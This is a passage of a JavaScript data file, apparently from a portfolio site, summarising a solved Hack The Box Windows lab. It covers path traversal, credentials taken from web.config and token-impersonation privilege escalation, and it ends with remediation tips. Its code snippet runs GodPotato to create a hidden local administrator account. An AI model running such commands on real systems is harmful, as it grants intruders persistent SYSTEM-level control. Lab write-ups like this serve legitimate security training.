    totalVotes: 375,
    reviewsCount: 160,
    imageUrl: 'https://res.cloudinary.com/z9mdashc/image/upload/v1790942422/Screenshot_From_2026-10-02_07-51-41_brch34.png',
    subtitle: 'HTB • Windows • Rank #11013 • Solved',
    description: 'WingData is a Windows machine focusing on web application directory traversal, sensitive credential extraction from configuration backups, and token impersonation privilege escalation.',
    tags: ['Windows', 'Directory Traversal', 'SeImpersonatePrivilege', 'GodPotato', 'Privilege Escalation'],
    reconnaissance: 'Nmap scan revealed open ports 80, 135, 445, 5985. Web service was a corporate file sharing and data portal.',
    initialFoothold: 'Exploited path traversal in file download handler to retrieve sensitive system configuration files. Discovered hardcoded service credentials in web.config, enabling WinRM login as user data_operator.',
    privilegeEscalation: 'Ran whoami /priv and noted SeImpersonatePrivilege was enabled. Uploaded and executed GodPotato / PrintSpoofer to spawn a process under NT AUTHORITY\\SYSTEM context.',
    codeSnippetTitle: 'SeImpersonatePrivilege Token Impersonation via GodPotato',
    codeSnippet: `# Verify privileges on target WinRM session
whoami /priv
# SeImpersonatePrivilege                Enabled

# Execute GodPotato to create local administrator
GodPotato-NET4.exe -cmd "cmd.exe /c net user dananjaya P@ssw0rd123! /add && net localgroup administrators dananjaya /add"`,
    remediation: [
      'Validate and sanitize user input for file download endpoints using Path.GetFileName() to prevent path traversal.',
      'Remove SeImpersonatePrivilege from service accounts that do not require delegation.',
      'Never store unencrypted credentials in web.config or configuration backups.'
    ]
  }
];
